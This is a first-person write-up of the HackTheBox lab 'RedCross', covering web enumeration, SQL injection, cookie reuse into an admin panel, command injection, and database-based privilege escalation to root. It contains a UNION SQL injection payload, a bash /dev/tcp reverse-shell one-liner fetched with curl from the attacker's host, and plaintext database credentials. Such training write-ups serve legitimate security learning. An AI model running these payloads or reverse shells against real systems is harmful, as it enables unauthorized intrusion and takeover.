RedCross — HTB Writeup

Overview:

Welcome back! This is yet another writeup for HackTheBox labs. This one is called RedCross and it is the first medium difficulty lab that I have done. It is definitely a big leap from the easy machines. There is a lot more enumeration involved, many different attack vectors to choose from, and all in all, it’s just a lot more time consuming. It definitely makes you feel more like an elite hacker though. I’ve loved the flow of the machine compared to a lot of easy machines that are just finding one public CVE and running a single script to get a root shell. This lab specifically focused on web enumeration, Linux privilege escalation, and reverse shells, and SQL injections. This is probably some of the most fun that I’ve had so far despite the struggles I faced in certain parts of this. Let’s get right into this one!

Reconnaissance:

Of course, I started off with an Nmap scan.

nmap -sCV -A -p- -v <IP>

the results didn’t show a whole lot. I expect this now, especially if it is a web pen testing type of lab where you always got to visit the webpage first.

I Only got that port 22, 80, and 443 were open. Pretty standard, so I went ahead and visited the web page.

To get past this we just add the name to our /etc/hosts file.

echo "<IP> intra.redcross.htb" | sudo tee -a /etc/hosts

This is what the webpage looks like. When I looked around, there wasn’t anything that stood out to me. All there was was a link to a contact form, so I used gobuster to search for any hidden directories.

gobuster dir -k -u https://intra.redcross.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

When using gobuster with an https target, you have to make sure that you use the -k flag to ignore the ssl certificate or the tool will be unable to run the target. Now, let us see what I found.

When I looked through /images, /pages, and /javascript, I could not find anything useful. /documentation, however, stood out to me so I decided to enumerate that directory further.

gobuster dir -k -u https://intra.redcross.htb/documentation/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x pdf,php -t 50

After patiently waiting, I found something that sparked some hope.

/account-signup.pdf gave me instructions on how to request guest credentials so that I am able to login on that main page with the username and password guest:guest. I had to format it a specific way so that I could get the credentials without issues.

Which brings us to this page.

I noticed that I could filter the info by putting in a userID number. I tried it with the admin number and other random ones, but the page would just go blank. So I decided to try something out.

1'

I appended an apostrophe at the end of the number 1 and got this interesting error. It’s an SQL error! Knowing that this prompt is vulnerable to SQL injections, I launched Burp Suite to examine the request more closely and try some payloads. I tried more than I would like to admit to be honest. I probably spent 3–4 hours running the same injections.

'+OR+1=1%29--%20UNION%20ALL%20SELECT%20username,password%20FROM%20users%20FROM%20DUAL --

This is just one example of one of the many I did. My goal was to see if I could dump a table of users and passwords and no amount of attempts or url-encoding helped me with it. I also tried running SQLmap but was blindsided by the WAF blocking me almost immediately. So I took a step back for a second and thought about what other initial steps I haven’t taken yet. Like I said earlier, It had been hours at this point so my brain was fried. A big thing that I have learned recently is how important recon is and to make sure you do enough of it to get a good feel about the different attack vectors you can take and to truly get a solid grasp on your target. I remembered that the webpage started with intra, so I decided to see if I could replace that word with another subdomain name such as admin and see if that lands me in an admin portal or something.

Well guess what! I guessed correctly the first time. I added admin.redcross.htb to my /etc/hosts file then I asked myself: How am I going to log in? I remembered earlier when I was trying SQL injections that in the request header, I was given an authentication cookie. I wasn’t sure if the Httponly flag was set, so I see what happens if I just insert that cookie into the request for the admin portal using the browser dev tools. For reference, if the Httponly flag isn’t set on a webpage, threat actors can try and use stolen cookies to authenticate themselves into a session that they normally wouldn’t be allowed too authenticate into.

Just like that, I’ve authenticated myself into the admin panel with two very intriguing options to look into. One being User Management and the other being Network Access. I went into user management first.

It looks like I can add any user I want from here. When I did, It gave me a password for the user that I added. Disclaimer, I worked on this for 2 days at very separate times due to having to work, so the names and IP addresses that you’ll see at this moment will be different towards the end, so don’t let that confuse you since it will all be the same methods to get the flags either way. After that, I went to see what Network Access had to offer.

Even better, I can whitelist my IP so that I don’t have to worry about that WAF anymore. I capture the request in Burp Suite just in case I want to examine it later if I get stuck again.

I decide to run an Nmap scan again to see if I can find any more ports open that I missed before.

nmap -sCV -A -p- -v <IP>

Now I have so much more. We see PostgreSQL running on port 5432, a mysterious service running on port 1025, and ftp running on port 21. Also, I tried running SQLmap again with the old burp request from the original SQL injections to see if something would come up.

sqlmap -r app.request --delay=1 --batch --dump

I ended up finding password hashes for a few users! Unfortunately, Those didn’t get me anywhere so I put them on the back burner for now.

I wanted to find out what was running on port 1025, so I set up a netcat listener and waited patiently because I figured it would fail to connect, but tell me what service was running on that port.

nc 10.129.17.108 1025

When you look up this service and version, you’ll find a Metasploit module just for it. Finally having a clear path of attack, It’s time for me to try and exploit this machine.

Exploitation:

msfconsole

I launch up the console.

search haraka
use 0

Find the module.

options

Configure everything I need to run the exploit.

set SRVHOST <OWN IP>
set email_to penelope@redcross.htb
set email_from admin@redcross.htb
set rhost <TARGET IP>
set rport 1025

About 30 seconds after I hit run, the exploit dropped. At this point, I felt like I was beaten into the ground. I spent the day before on SQL injections until 4 hours later when I realized that I didn’t even try to look for obvious subdomains and now the exploit that I spent so much time to finally find just won’t work. I consulted writeups after I finished the machine and found out that this Metasploit module is supposed to work but no matter what I options I changed, it still would still drop the connection everytime. Remember the Network Access request I captured? I’m going back to that to see what I can do.

Looking at this request, the ip&action parameter is enticing. After messing around with it a bit, I found something. If I change the &action to deny and add a pipe followed by commands after the ip address, I can access the server that way!

Running ls, I see a bunch of PHP files and one of which sticks out because of just how many times that I’ve seen it throughout this lab. Its the actions.php file which we even see in this request itself. I’m thinking that I could try to execute a reverse shell on the target to give me access. I tried many different ones. I tried executing a python, php, and bash reverse shell directly in the request, but my listener struggled to gain a connection. So I decided to download it onto the machine. I settled with the famous bash one-liner. This is an amazing tool to always keep in your notes to start it fast whenever you need too.

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

I use curl and a python simple http server to download it onto the server.

curl http://<IP>:<PORT>/revshell.sh > /temp/revshell.sh

This is how I used curl. I downloaded it into the temp directory.

This is how I ran the python server. I did forget to get a screenshot of how I executed the reverse shell but I’ll put the command that I inserted after the pipe below this paragraph. I also set up my netcat listener so that I get a connection from the shell.

bash /temp/revshell.sh
whoami

I landed with www-data. I finally got a shell on the target! The first thing I did was try and find that actions.php file. It was driving me crazy just how much I’ve been seeing it without being able to look at its contents.

pwd
ls
cat actions.php

This file was a gold mine. I found plaintext credentials to the PostgreSQL server!

$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");

With these credentials and knowing that we are whitelisted, I can use these to login.

psql -h 127.0.0.1 -U unixusrmgr unix

Immediately after logging in, I list all the databases.

\dt

Obviously, who wouldn’t open the passwd_table after seeing this.

select * from passwd_table;

We see that the homedir is set to /var/jail/home and that the gid is not 0, meaning that I probably can’t open the user flag even if I tried. I also see that any users that I add are in this table so maybe I can see what I can do if I ssh into the server. Before I do that though, I change the homedir to /home and set my gid to root(0).

update passwd_table set homedir='/home' where homedir='/var/jail/home';
select * from passwd_table
update passwd_table set gid=0 where gid=1001;
select * from passwd_table;

Now I ssh into the server, I did make another user since this was about 24 hours later and I did not have the password for the original user I created.

ssh rick@redcross.htb

Even after I changed the homedir and my gid, I was still unable to open the user flag. I also forgot to get a screenshot of this but here is the commands I did.

cd home
ls
cd penelope
ls
cat user.txt

I also couldn’t run sudo for anything. My first thought was to check the sudoers group.

All I should have to do now is change my gid again from 0 to 27. I also forgot to screenshot this because I was running out of time before I had to get ready to work but I’ll still show the command I did.

update passwd_table set gid=27 where gid=0;

I terminated my ssh connection and logged in again and tried to sudo su my way up.

sudo su

It was smooth from here. I went to open the user flag.

cd home
ls
cd penelope
cat user.txt

Then the root flag.

Debrief:

I felt so accomplished in this moment. It felt amazing to do a lab where I felt like I had to think critically and really apply the skills that I have learned so far rather than just running a 7 year old script from Github. I was stuck on multiple parts for hours but I noticed the little steps I made along the way and kept going because I knew that I could pwn this machine. I hope everyone reading finds this writeup very helpful despite the lack of some pretty important screenshots and that my methodology was explained well. I look forward to rooting more machines in the near future! These harder machines have been really helping me build my methodology and get in the mindset of what its like to be a pen tester. Whether its finding every possible vector to attack the target or patiently waiting for a connection to the victim machine, I’m very happy with how much I’m learning! I’ll definitely be posting more writeups soon!
